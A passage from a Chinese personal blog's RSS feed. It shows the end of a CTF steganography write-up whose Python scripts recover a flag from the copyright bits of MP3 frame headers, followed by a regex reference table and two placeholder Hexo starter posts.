class=&#34;string&#34;&gt;r&amp;#x27;\d&amp;#123;8&amp;#125;&amp;#x27;&lt;/span&gt;, target_bit) &lt;span class=&#34;comment&#34;&gt;#利用正则匹配每8个数字为一组，将其变为字符串数组方便处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(textArr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; textArr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)).strip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#int(&amp;#x27;二进制数&amp;#x27;, 2) 就转成了10进制   chr(&amp;#x27;10进制数&amp;#x27;) 就转成字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#print(flag) #发现后面有很多未知空字符，删也删不掉&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   flag = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\w+\&amp;#123;.+\&amp;#125;&amp;#x27;&lt;/span&gt;,flag) &lt;span class=&#34;comment&#34;&gt;#用正则匹配标准flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;flag{0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!}&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134916608.png&#34; alt=&#34;image-20220917134916608&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-常用正则-补充&#34;&gt;&lt;a href=&#34;#0x04-常用正则-补充&#34; class=&#34;headerlink&#34; title=&#34;0x04 常用正则(补充)&#34;&gt;&lt;/a&gt;0x04 常用正则(补充)&lt;/h2&gt;&lt;p&gt;①&lt;strong&gt;显示不可打印的字符&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\a&lt;/td&gt;
&lt;td&gt;报警&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\b&lt;/td&gt;
&lt;td&gt;退格&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\f&lt;/td&gt;
&lt;td&gt;换页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td&gt;换行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\r&lt;/td&gt;
&lt;td&gt;回车&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\t&lt;/td&gt;
&lt;td&gt;字表符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;②&lt;strong&gt;指定预定义的字符集&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\d&lt;/td&gt;
&lt;td&gt;任意一个十进制数字[0-9]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\D&lt;/td&gt;
&lt;td&gt;任意一个非十进制数字&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\s&lt;/td&gt;
&lt;td&gt;任意一个空白字符(空格、换行符、换页符、回车符、字表符)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\S&lt;/td&gt;
&lt;td&gt;任意一个非空白字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\w&lt;/td&gt;
&lt;td&gt;任意一个单词字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\W&lt;/td&gt;
&lt;td&gt;任意个非单词字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;③&lt;strong&gt;限定符(？*+{n，m}.)&lt;/strong&gt;&lt;br&gt;限定符主要是用来限定每个字符串出现的次数。&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;限定字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;？&lt;/td&gt;
&lt;td&gt;零次或一次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;td&gt;零次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;一次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n}&lt;/td&gt;
&lt;td&gt;n次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n,}&lt;/td&gt;
&lt;td&gt;至少n次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n,m}&lt;/td&gt;
&lt;td&gt;n到m次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td&gt;匹配任意一个字符（不包含换行符）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h2 id=&#34;0x05-再来一道&#34;&gt;&lt;a href=&#34;#0x05-再来一道&#34; class=&#34;headerlink&#34; title=&#34;0x05 再来一道&#34;&gt;&lt;/a&gt;0x05 再来一道&lt;/h2&gt;&lt;p&gt;翻看了几帧发现&lt;code&gt;private_bit&lt;/code&gt;位都是0，似乎并没有存储数据。但是在翻看的时候发现，++&lt;code&gt;uint32 copyright&lt;/code&gt;这一位似乎内藏玄机++，这一位在相邻几帧的数据有0有1，查询得知这是版权位，通常不会出现不同帧有0有1的情况。&lt;/p&gt;
&lt;p&gt;于是决定将&lt;code&gt;copyright&lt;/code&gt;位的数据提取出来看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134512128.png&#34; alt=&#34;image-20220917134512128&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# coding:utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = &lt;span class=&#34;number&#34;&gt;0xF05A4&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 起始位置，为什么+2 下面有解释&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_bit = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2.mp3&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 以二进制打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 提取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; n &amp;lt; &lt;span class=&#34;number&#34;&gt;0xC12623&lt;/span&gt;:  &lt;span class=&#34;comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.seek(n, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 往后读取一个字节（8位）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    padding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 从中提取倒数第2个bit 也就是padding的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.seek(n + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    target_bit += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 从中提取倒数第1个bit 也就是copyright的值，需要累加拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; padding == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n += &lt;span class=&#34;number&#34;&gt;0x415&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n += &lt;span class=&#34;number&#34;&gt;0x414&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(target_bit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# textArr = re.findall(&amp;#x27;.&amp;#123;&amp;#x27;+str(8)+&amp;#x27;&amp;#125;&amp;#x27;, result)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;textArr = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\d&amp;#123;8&amp;#125;&amp;#x27;&lt;/span&gt;, target_bit)  &lt;span class=&#34;comment&#34;&gt;# 利用正则匹配每8个数字为一组，将其变为字符串数组方便处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(textArr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; textArr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)).strip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# int(&amp;#x27;二进制数&amp;#x27;, 2) 就转成了10进制   chr(&amp;#x27;10进制数&amp;#x27;) 就转成字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\w+\&amp;#123;.+\&amp;#125;&amp;#x27;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;flag{b3d7bed5-e8da-4d9c-848c-e5d332d63bcd}&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134626086.png&#34; alt=&#34;image-20220917134626086&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</guid>
            <title>测试文章</title>
            <link>https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</link>
            <category>原创</category>
            <pubDate>Thu, 14 Jul 2022 03:13:28 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;这是一篇测试文章&lt;/p&gt;
&lt;img src=&#34;/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png&#34; class=&#34;&#34; title=&#34;图片引用方法一&#34;&gt;
&lt;p&gt;&lt;img src=&#34;test.png&#34; alt=&#34;图片引用方法二&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/07/13/hello-world/</guid>
            <title>Hello World</title>
            <link>https://kiyomijin.github.io/2022/07/13/hello-world/</link>
            <pubDate>Wed, 13 Jul 2022 23:20:21 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;Quick-Start&#34;&gt;&lt;a href=&#34;#Quick-Start&#34; class=&#34;headerlink&#34; title=&#34;Quick Start&#34;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&#34;Create-a-new-post&#34;&gt;&lt;a href=&#34;#Create-a-new-post&#34; class=&#34;headerlink&#34; title=&#34;Create a new post&#34;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;Run-server&#34;&gt;&lt;a href=&#34;#Run-server&#34; class=&#34;headerlink&#34; title=&#34;Run server&#34;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;Generate-static-files&#34;&gt;&lt;a href=&#34;#Generate-static-files&#34; class=&#34;headerlink&#34; title=&#34;Generate static files&#34;&gt;&lt;/a&gt;Generate static files&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;Deploy-to-remote-sites&#34;&gt;&lt;a href=&#34;#Deploy-to-remote-sites&#34; class=&#34;headerlink&#34; title=&#34;Deploy to remote sites&#34;&gt;&lt;/a&gt;Deploy to remote sites&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
